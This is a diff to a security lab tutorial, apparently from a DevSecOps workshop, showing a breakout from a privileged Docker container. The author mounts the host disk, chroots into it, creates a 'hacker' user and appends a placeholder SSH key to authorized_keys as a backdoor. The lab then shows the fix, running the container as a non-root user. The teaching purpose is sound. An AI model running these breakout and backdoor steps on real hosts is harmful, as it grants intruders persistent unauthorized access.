+/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,discard)
+/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,discard)
+/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,discard)
+devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+$ ls -al /home # Nothing in the home directory in the container
+total 8
+drwxr-xr-x 2 root root 4096 Apr 15  2020 .
+drwxr-xr-x 1 root root 4096 Apr 26 02:40 ..
+$ mount /dev/xvda1 /mnt
+```
+
+Now, we can `chroot` into that filesystem and we are effectively on the host computer. Let's see see if we can find
+anything juicy, and maybe drop a quick backdoor for ourselves later:
+
+```{code-block} console
+---
+emphasize-lines: 6,20
+---
+$ chroot /mnt
+$ ls -al /home # We can now see /home/ubuntu/ on the host filesystem
+total 12
+drwxr-xr-x  3 root   root   4096 Apr 26 00:43 .
+drwxr-xr-x 19 root   root   4096 Apr 26 00:43 ..
+drwxr-xr-x  5 ubuntu ubuntu 4096 Apr 26 00:54 ubuntu
+$ sudo useradd hacker
+sudo: unable to resolve host 86ffe706cfb4: Temporary failure in name resolution
+$ sudo passwd hacker
+sudo: unable to resolve host 86ffe706cfb4: Temporary failure in name resolution
+New password:
+Retype new password:
+passwd: password updated successfully
+$ # Now, let's drop our public key into the ubuntu user's authorized_keys file so I have another way back in
+$ echo 'ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor' >> /home/ubuntu/.ssh/authorized_keys
+$ exit
+$ exit
+exit
+```
+
+And finally, we can see evidence of the break-in on the host system now:
+
+```{code-block} console
+$ tail -3 /etc/passwd
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+hacker:x:1001:1001::/home/hacker:/bin/sh
+$ tail -1 /home/ubuntu/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzAAAAAAAAATE5AAAAIH/JRUsEfBrjsVQmeyBrjsVQmeyBrjsVQmeyBrjsVQYIX example-backdoor
+```
 
 ### Fix
 
-### Failed breakout
+How do we prevent these sort of issues? Specific to this breakout, even if we continue to allow `--privileged`, we can
+mitigate some of the impact by requiring that non-root users be used at runtime. For instance:
 
-## Container Breakout
+```{code-block} bash
+docker run -it -u 1001 --privileged ubuntu:20.04
+```
+
+Now when we go to mount the host filesystem or run `chroot`, we get an error:
+
+```{code-block} console
+---
+emphasize-lines: 14
+---
+$ mount | grep '/dev/'
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,discard)
+/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,discard)
+/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,discard)
+devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+$ ls -al /home
+total 8
+drwxr-xr-x 2 root root 4096 Apr 15  2020 .
+drwxr-xr-x 1 root root 4096 Apr 26 02:56 ..
+$ mount /dev/xvda1 /mnt
+mount: only root can do that
+$ chroot /mnt
+chroot: cannot change root directory to '/mnt': Operation not permitted
+```
+
+Breakout averted! Great job 😊
 
 ## Conclusion
 
 If you've made it this far, congratulations!
 
-Looking for more content like this?
+Have any ideas or feedback on this lab? Connect with me [on LinkedIn](https://linkedin.com/in/jonzeolla/) and send me a
+message.
 
-- Connect with me [on LinkedIn](https://linkedin.com/in/jonzeolla/)
-- Check out SANS [SEC540 class](http://sans.org/sec540) for 5 days of Cloud Security and DevSecOps training
+If you'd like more content like this, check out SANS [SEC540 class](http://sans.org/sec540) for 5 full days of Cloud
+Security and DevSecOps training.
 
 ## Cleanup
 
-Don't forget to stop or terminate your EC2 instance!
+Don't forget to terminate your EC2 instance! If you used the CloudFormation templates above, you should be able to go
+back into your [stacks](https://console.aws.amazon.com/cloudformation/home) and delete the stack that you used to create
+the lab.
+
+If you aren't quite ready to terminate your EC2 instance, here are some quick cleanup tasks:
+
+```{warning}
+Running the following commands WILL undo parts of the lab, and should only be used when you are done.
+```
+
+```{code-block} cleanup
+docker container rm dummy
+docker kill registry
+docker container rm registry
+docker network remove workshop
+docker volume rm workshop-certs
+rm -f cosign.key cosign.pub
+```
